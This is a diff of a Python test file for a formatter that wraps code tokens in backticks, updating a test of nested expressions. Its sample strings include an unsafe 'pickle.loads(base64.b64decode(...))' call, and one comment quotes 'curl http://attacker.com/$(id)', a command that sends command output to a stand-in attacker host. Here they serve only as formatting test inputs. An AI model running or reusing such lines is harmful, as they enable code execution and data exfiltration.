@@ -128,11 +128,11 @@ class TestBareTokenClasses:
     def test_non_code_is_left_alone(self, given):
         assert _fmt(given) == given
 
-    def test_nested_token_is_not_half_wrapped(self):
-        # `pickle.loads(base64.b64decode(...))` — wrapping only the INNER call
-        # emits `pickle.loads(`base64.b64decode(x)`)`. Bare beats half-wrapped.
+    def test_nested_token_is_wrapped_as_one_balanced_expression(self):
+        # The canonical balanced scanner owns the complete outer expression;
+        # no inner call may become a separate nested code span.
         given = "calls pickle.loads(base64.b64decode(payload.payload)) without auth"
-        assert "`" not in _fmt(given)
+        assert _fmt(given) == "calls `pickle.loads(base64.b64decode(payload.payload))` without auth"
 
     def test_url_inside_a_code_payload_is_not_mangled(self):
         # 'curl http://attacker.com/$(id)' — matching up to the `)` would
